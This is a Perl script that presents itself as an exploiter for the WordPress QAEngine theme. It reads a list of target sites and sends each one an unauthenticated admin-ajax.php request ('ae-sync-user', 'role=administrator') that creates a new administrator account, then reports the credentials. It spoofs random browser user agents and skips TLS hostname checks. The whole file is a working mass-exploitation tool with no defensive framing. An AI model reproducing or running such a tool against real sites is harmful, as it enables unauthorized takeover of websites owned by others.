#!/usr/bin/perl
use LWP::UserAgent;
# @version 1.0
# @author M-A
# @link https://raw.githubusercontent.com/mranarshit/wp-Up_exp/master/qaengine.pl
# Perl Lov3r :)
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
 
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
flag();
print "[+] Enter List Of Target : ";
chomp (my $list=<>);
print "[+] Enter User : ";
chomp (my $user=<>);
print "[+] Enter Password : ";
chomp (my $pass=<>);
print "[+] Started : $datestring\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test upload\n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
print "\n[$i] $web OK! Let's Work!\n\n";
expadd($web,$user,$pass);#exploiting website :)
} 
sub expadd{
    my ($url,$user,$pass) = @_;
    my $useragent = randomagent();#Get a Random User Agent 
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept 
    $ua->timeout(10);
    $ua->agent($useragent);
    my $path = "/wp-admin/admin-ajax.php?action=ae-sync-user&method=create&user_login=".$user."&user_pass=". $pass ."&role=administrator";  
    my $target = $url.$path;
    my $response = $ua->get($target);
    if ($response->content=~/success\":true/){
        print "[OK] New Admin Successfuly Created \n";
        print "| User : $user \n";
        print "| Pass : $pass \n";
    }
    else {print "[+] Error Creating New User \n\n";}


}
sub flag {print "\n[+] WP QAEngine Theme R3m0t3 C0d3 Ex3cut10n (Add WP Admin) Exploiter \n[*] Coder => M-A\n\n";
}
